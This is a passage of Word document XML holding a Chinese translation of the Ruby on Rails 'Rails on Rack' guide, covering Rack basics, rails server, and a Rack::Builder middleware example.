            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Rails on Rack</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="0B45DAA5" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="008938C9" w:rsidP="004E5E0B">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="238"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId1111" w:anchor="2-1" w:history="1">
        <w:r w:rsidR="004E5E0B" w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Rails 应用的 Rack 对象</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="11E1B3CD" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="008938C9" w:rsidP="004E5E0B">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="238"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId1112" w:anchor="2-2" w:history="1">
        <w:r w:rsidR="004E5E0B" w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
          </w:rPr>
          <w:t>rails server</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="1ABB7A5E" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="008938C9" w:rsidP="004E5E0B">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="238"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId1113" w:anchor="2-3" w:history="1">
        <w:r w:rsidR="004E5E0B" w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
          </w:rPr>
          <w:t>rackup</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="25523926" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="008938C9" w:rsidP="004E5E0B">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="238"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId1114" w:anchor="3" w:history="1">
        <w:r w:rsidR="004E5E0B" w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>动作控制器中间件堆栈</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="5E6727D7" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="008938C9" w:rsidP="004E5E0B">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="238"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId1115" w:anchor="3-1" w:history="1">
        <w:r w:rsidR="004E5E0B" w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>检查中间件堆栈</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="3670566C" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="008938C9" w:rsidP="004E5E0B">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="238"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId1116" w:anchor="3-2" w:history="1">
        <w:r w:rsidR="004E5E0B" w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>配置中间件堆栈</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="0EB0359E" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="008938C9" w:rsidP="004E5E0B">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="238"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId1117" w:anchor="3-3" w:history="1">
        <w:r w:rsidR="004E5E0B" w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>内部中间件</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="1905B3B6" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="008938C9" w:rsidP="004E5E0B">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="238"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId1118" w:anchor="3-4" w:history="1">
        <w:r w:rsidR="004E5E0B" w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>定制内部中间件堆栈</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="0ACC0145" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="008938C9" w:rsidP="004E5E0B">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="238"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId1119" w:anchor="3-5" w:history="1">
        <w:r w:rsidR="004E5E0B" w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>使用 Rack Builder</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="4F5977BA" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="008938C9" w:rsidP="004E5E0B">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="238"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId1120" w:anchor="4" w:history="1">
        <w:r w:rsidR="004E5E0B" w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>资源</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="3652F53C" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="008938C9" w:rsidP="004E5E0B">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="238"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId1121" w:anchor="4-1" w:history="1">
        <w:r w:rsidR="004E5E0B" w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>学习 Rack</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="2796D065" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="008938C9" w:rsidP="004E5E0B">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="238"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId1122" w:anchor="4-2" w:history="1">
        <w:r w:rsidR="004E5E0B" w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>理解中间件</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="5FC5851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本指南假定 Rack 协议及 Rack 概念例如中间件、url 映射和 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Rack::Builder</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37907BE2"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1 Rack 简介</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CED587B" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:beforeAutospacing="1" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Rack 为开发 Ruby web 应用提供了一个最小的模块化和适应性接口。通过对 HTTP 请求与响应 的尽可能最简单的方式包装，它统一和提炼 Web 服务器 ，Web 框架，和之间的软件（所谓的中间件）的 API 为单一方法调用。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7868362E"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 </w:t>
      </w:r>
      <w:hyperlink r:id="rId1123" w:history="1">
        <w:r w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Rack API 文档</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="50F3783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解释 Rack 并不在本指南的范围内。以防你不熟悉 Rack 的基础，你应该参考下面的"资源":#resources 一节。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27570F2D"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2 Rails on Rack</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51EDF23C"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2.1 Rails 应用的 Rack 对象</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3072CD2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ActionController::Dispatcher.new</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 是一个 Rails 应用的主要 Rack 应用对象。任何 Rack 兼容的 Web 服务器应使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>ActionController::Dispatcher.new</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 对象作为 Rails 应用。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F3607F9"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 xml:space="preserve">2.2 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>rails server</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16DCA00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rails server</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 做了创建一个 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Rack::Builder</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 对象和启动 web 服务器的基本工作。这是 Rails 的相当于 Rack 的 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>rackup</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 脚本。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28F39B03"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下面是如何使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>rails server</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 创建一个 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Rack::Builder</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 实例</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6480"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="3C2DFAA3" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="248E889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app = Rack::Builder.new</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>{</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0B1B2C8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 Rails::Rack::LogTailer unless</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>options[:detach]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2C86F8F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 Rails::Rack::Debugger if</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>options[:debugger]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="510962E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use ActionDispatch::Static</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="702550C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run ActionController::Dispatcher.new</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6299AA7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}.to_app</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="4AF523C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以上使用中间件的代码中主要在开发环境中有用。下表说明它们的用法：</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5"/>
        <w:gridCol w:w="4755"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="6EB475DE" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="396A0D44" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:b/>
                <w:bCs/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:b/>
                <w:bCs/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>中间件</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="348BB53B" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:b/>
                <w:bCs/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:b/>
                <w:bCs/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>用途</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="0F00F072" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1C1AB2E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Rails::Rack::LogTailer</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="474DCEB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追加日志文件输出到控制台</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
